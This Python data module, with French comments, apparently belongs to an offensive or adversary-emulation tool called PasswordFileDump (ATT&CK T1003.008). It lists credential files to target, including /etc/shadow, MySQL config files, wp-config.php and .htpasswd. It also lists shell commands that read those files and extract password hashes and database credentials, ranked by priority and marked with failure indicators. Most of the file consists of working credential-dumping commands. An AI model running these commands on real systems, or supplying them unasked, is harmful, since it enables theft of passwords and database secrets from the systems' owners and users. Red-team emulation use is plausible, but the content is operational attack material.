#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat May 23 2026

@author: hounsousamuel

Helper data pour PasswordFileDump (T1003.008).
"""

from typing import Dict, Any


# =============================================================================
# TARGETS — fichiers cibles
# =============================================================================

TARGETS: Dict[str, Dict[str, Any]] = {
    "/etc/shadow": {
        "description": "Hashes des mots de passe de tous les users système",
        "requires_root": True,
        "priority": "critical",
    },
    "/etc/passwd": {
        "description": "Liste des comptes utilisateurs et leurs shells",
        "requires_root": False,
        "priority": "high",
    },
    "/etc/master.passwd": {
        "description": "Fichier shadow BSD (équivalent /etc/shadow sur FreeBSD/OpenBSD)",
        "requires_root": True,
        "priority": "high",
    },
    "/etc/mysql/debian.cnf": {
        "description": "Credentials MySQL root générés à l'installation (Debian/Ubuntu)",
        "requires_root": True,
        "priority": "high",
    },
    "/root/.my.cnf": {
        "description": "Credentials MySQL client de root stockés en clair",
        "requires_root": True,
        "priority": "high",
    },
    "/home/*/.my.cnf": {
        "description": "Credentials MySQL client des users standards",
        "requires_root": False,
        "priority": "medium",
    },
    "/etc/phpmyadmin/config-db.php": {
        "description": "Credentials de la base phpMyAdmin",
        "requires_root": False,
        "priority": "medium",
    },
    "/var/www/html/wp-config.php": {
        "description": "Credentials base de données WordPress (DB_USER, DB_PASSWORD, DB_HOST)",
        "requires_root": False,
        "priority": "high",
    },
    "/etc/nginx/.htpasswd": {
        "description": "Credentials HTTP Basic Auth pour Nginx",
        "requires_root": False,
        "priority": "medium",
    },
    "/etc/apache2/.htpasswd": {
        "description": "Credentials HTTP Basic Auth pour Apache",
        "requires_root": False,
        "priority": "medium",
    },
}


# =============================================================================
# COMMANDS — commandes à exécuter
# =============================================================================

COMMANDS: Dict[str, Dict[str, Any]] = {
    "cat /etc/shadow 2>/dev/null || echo 'SHADOW_DENIED'": {
        "description": "Lecture /etc/shadow — hashes des mots de passe",
        "fail_indicator": "SHADOW_DENIED",
        "target": "/etc/shadow",
    },
    "cat /etc/passwd 2>/dev/null || echo 'PASSWD_DENIED'": {
        "description": "Lecture /etc/passwd — liste des users",
        "fail_indicator": "PASSWD_DENIED",
        "target": "/etc/passwd",
    },
    "cat /etc/mysql/debian.cnf 2>/dev/null || echo 'MYSQL_CNF_DENIED'": {
        "description": "Lecture credentials MySQL Debian",
        "fail_indicator": "MYSQL_CNF_DENIED",
        "target": "/etc/mysql/debian.cnf",
    },
    "cat /root/.my.cnf 2>/dev/null || echo 'MY_CNF_DENIED'": {
        "description": "Lecture credentials MySQL client root",
        "fail_indicator": "MY_CNF_DENIED",
        "target": "/root/.my.cnf",
    },
    "cat /var/www/html/wp-config.php 2>/dev/null | grep -E 'DB_(NAME|USER|PASSWORD|HOST)' || echo 'WP_CONFIG_DENIED'": {
        "description": "Extraction credentials WordPress",
        "fail_indicator": "WP_CONFIG_DENIED",
        "target": "/var/www/html/wp-config.php",
    },
    "cat /etc/nginx/.htpasswd 2>/dev/null || echo 'NGINX_HTPASSWD_DENIED'": {
        "description": "Lecture .htpasswd Nginx",
        "fail_indicator": "NGINX_HTPASSWD_DENIED",
        "target": "/etc/nginx/.htpasswd",
    },
    "cat /etc/apache2/.htpasswd 2>/dev/null || echo 'APACHE_HTPASSWD_DENIED'": {
        "description": "Lecture .htpasswd Apache",
        "fail_indicator": "APACHE_HTPASSWD_DENIED",
        "target": "/etc/apache2/.htpasswd",
    },
    "grep -v '/nologin\\|/false' /etc/passwd 2>/dev/null | cut -d: -f1,3,6,7 || echo 'PASSWD_PARSE_DENIED'": {
        "description": "Extraction des users avec shell actif depuis /etc/passwd",
        "fail_indicator": "PASSWD_PARSE_DENIED",
        "target": "/etc/passwd",
    },
    "grep -v '^[^:]*:[!*]' /etc/shadow 2>/dev/null | cut -d: -f1,2 || echo 'SHADOW_PARSE_DENIED'": {
        "description": "Extraction des users avec hash valide depuis /etc/shadow",
        "fail_indicator": "SHADOW_PARSE_DENIED",
        "target": "/etc/shadow",
    },
    "id": {
        "description": "Vérification des privilèges courants",
        "fail_indicator": None,
        "target": None,
    },
    "whoami": {
        "description": "Identité de l'utilisateur courant",
        "fail_indicator": None,
        "target": None,
    },
}